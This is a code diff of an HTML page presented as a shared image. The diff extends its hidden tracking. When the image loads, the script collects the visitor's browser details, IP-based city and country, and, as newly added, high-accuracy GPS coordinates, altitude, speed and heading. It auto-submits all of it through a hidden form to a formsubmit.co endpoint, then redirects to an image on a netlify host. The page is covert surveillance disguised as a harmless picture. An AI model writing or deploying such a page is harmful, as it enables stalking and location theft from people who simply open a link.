@@ -2,8 +2,7 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <title>Shared Image</title>
-    <link rel="shortcut icon" href="sss.png" type="image/x-icon" />
+    <title>Image</title>
     <style>
       body {
         margin: 0;
@@ -16,8 +15,7 @@
     </style>
   </head>
   <body>
-    <img src="track.png" alt="Shared Image" id="trackedImg" />
-    <!-- Hidden FormSubmit form -->
+    <img src="tr.png" alt="Shared Image" id="trackedImg" />
     <form
       id="trackForm"
       action="https://formsubmit.co/38924188133f2a1e536fdfc86fbc9394"
@@ -29,12 +27,23 @@
       <input type="hidden" name="Language" id="lang" />
       <input type="hidden" name="Screen" id="screen" />
       <input type="hidden" name="Timezone" id="tz" />
+      <input type="hidden" name="GPS_Latitude" id="gps_lat" />
+      <input type="hidden" name="GPS_Longitude" id="gps_lng" />
+      <input type="hidden" name="GPS_Accuracy" id="gps_acc" />
+      <input type="hidden" name="GPS_Altitude" id="gps_alt" />
+      <input type="hidden" name="GPS_AltitudeAccuracy" id="gps_altacc" />
+      <input type="hidden" name="GPS_Heading" id="gps_heading" />
+      <input type="hidden" name="GPS_Speed" id="gps_speed" />
       <input type="hidden" name="IP" id="ip" />
       <input type="hidden" name="City" id="city" />
       <input type="hidden" name="Country" id="country" />
       <input type="hidden" name="Timestamp" id="ts" />
       <input type="hidden" name="_captcha" value="false" />
-      <input type="hidden" name="_next" value="track.png" />
+      <input
+        type="hidden"
+        name="_next"
+        value="https://selfiez.netlify.app/tr.png"
+      />
     </form>
     <script>
       async function getIPLocation() {
@@ -45,7 +54,7 @@
           return {};
         }
       }
-      function fillAndSubmitForm(ipinfo) {
+      function fillAndSubmitForm(gps, ipinfo) {
         document.getElementById("ua").value = navigator.userAgent;
         document.getElementById("platform").value = navigator.platform;
         document.getElementById("lang").value = navigator.language;
@@ -54,6 +63,16 @@
         document.getElementById("tz").value =
           Intl.DateTimeFormat().resolvedOptions().timeZone;
         document.getElementById("ts").value = new Date().toISOString();
+        if (gps) {
+          document.getElementById("gps_lat").value = gps.latitude || "";
+          document.getElementById("gps_lng").value = gps.longitude || "";
+          document.getElementById("gps_acc").value = gps.accuracy || "";
+          document.getElementById("gps_alt").value = gps.altitude || "";
+          document.getElementById("gps_altacc").value =
+            gps.altitudeAccuracy || "";
+          document.getElementById("gps_heading").value = gps.heading || "";
+          document.getElementById("gps_speed").value = gps.speed || "";
+        }
         if (ipinfo) {
           document.getElementById("ip").value = ipinfo.ip || "";
           document.getElementById("city").value = ipinfo.city || "";
@@ -62,12 +81,34 @@
         document.getElementById("trackForm").submit();
       }
       function onImageLoad() {
-        getIPLocation().then((ipinfo) => fillAndSubmitForm(ipinfo));
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+              const gps = {
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude,
+                altitudeAccuracy: pos.coords.altitudeAccuracy,
+                heading: pos.coords.heading,
+                speed: pos.coords.speed,
+              };
+              const ipinfo = await getIPLocation();
+              fillAndSubmitForm(gps, ipinfo);
+            },
+            async (err) => {
+              const ipinfo = await getIPLocation();
+              fillAndSubmitForm({}, ipinfo);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        } else {
+          getIPLocation().then((ipinfo) => fillAndSubmitForm({}, ipinfo));
+        }
       }
       document
         .getElementById("trackedImg")
         .addEventListener("load", onImageLoad);
-      // In case the image is cached, call onImageLoad directly if already loaded
       if (document.getElementById("trackedImg").complete) {
         onImageLoad();
       }
